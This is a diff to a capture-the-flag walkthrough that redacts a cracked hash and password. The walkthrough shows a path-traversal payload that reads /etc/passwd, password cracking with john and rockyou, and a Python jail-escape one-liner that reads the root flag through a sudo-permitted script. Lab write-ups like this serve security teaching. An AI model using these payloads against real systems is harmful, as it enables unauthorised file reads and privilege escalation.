@@ -71,6 +71,7 @@ ftp> get rize_and_kaneki.jpg
 ...
 ```
 
+### 1.3 File Exploration
 ```
 ❯ file need_to_talk
 need_to_talk: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=adba55165982c79dd348a1b03c32d55e15e95cf6, for GNU/Linux 3.2.0, not stripped
@@ -132,22 +133,24 @@ if you can talk it allright you got my secret directory
 Using: [CyberChef](http://icyberchef.com/)
 
 ![](https://i.imgur.com/zVhiiBo.png)
+We have the secret directory!
 
+### 1.4 Web Exploration
 ![](https://i.imgur.com/qPK7Yzn.png)
+It tells us to scan, so let's do that.
 
 ![](https://i.imgur.com/TOFQmZX.png)
+We reach at an intersting page, which looks vulnerable to LFI.
 
 `index.php?view=../../../../etc/passwd`
 
 ![](https://i.imgur.com/d5MDFgW.png)
+Intersting! But what about a specially crafted request? Trying the below: `index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`
 
+We get the good stuff!
+`{username}:{some tasty info mmmmm} `
 
-`index.php?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd`
-
-
-`kamishiro:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:1001:1001:,,,:/home/kamishiro:/bin/bash `
-
-
+### 1.5 Hash Cracking
 ```
 ❯ john --wordlist="/usr/share/wordlists/rockyou.txt" hash.txt
 Using default input encoding: UTF-8
@@ -155,31 +158,24 @@ Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-password123      (kamishiro)
+{password mmmmm}      ({username})
 1g 0:00:00:01 DONE (2021-03-17 02:43) 0.7812g/s 1200p/s 1200c/s 1200C/s kucing..mexico1
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-```
-kamishiro@vagrant:~$ ls
-jail.py  user.txt
-kamishiro@vagrant:~$ pwd
-/home/kamishiro
-kamishiro@vagrant:~$ cat user.txt 
-e6215e25c0783eb4279693d9f073594a
-```
+## 2. Foothild
 
 ```
-kamishiro@vagrant:~$ sudo -l
-[sudo] password for kamishiro: 
-Matching Defaults entries for kamishiro on vagrant.vm:
+{username}@vagrant:~$ sudo -l
+[sudo] password for {username}: 
+Matching Defaults entries for {username} on vagrant.vm:
     env_reset, exempt_group=sudo, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User kamishiro may run the following commands on vagrant.vm:
-    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
-kamishiro@vagrant:~$ ls -la
+User {username} may run the following commands on vagrant.vm:
+    (ALL) /usr/bin/python3 /home/{username}/jail.py
+{username}@vagrant:~$ ls -la
 total 16
 drwxr-xr-x 2 root root 4096 Jan 23 22:33 .
 drwxr-xr-x 4 root root 4096 Jan 23 22:27 ..
@@ -188,7 +184,7 @@ drwxr-xr-x 4 root root 4096 Jan 23 22:27 ..
 ```
 
 ```
-kamishiro@vagrant:~$ cat jail.py 
+{username}@vagrant:~$ cat jail.py 
 #! /usr/bin/python3
 #-*- coding:utf-8 -*-
 def main():
@@ -227,3 +223,4 @@ No Kaneki you are so dead
 ```
 __builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cat /root/root.txt')
 ```
+And we are done!
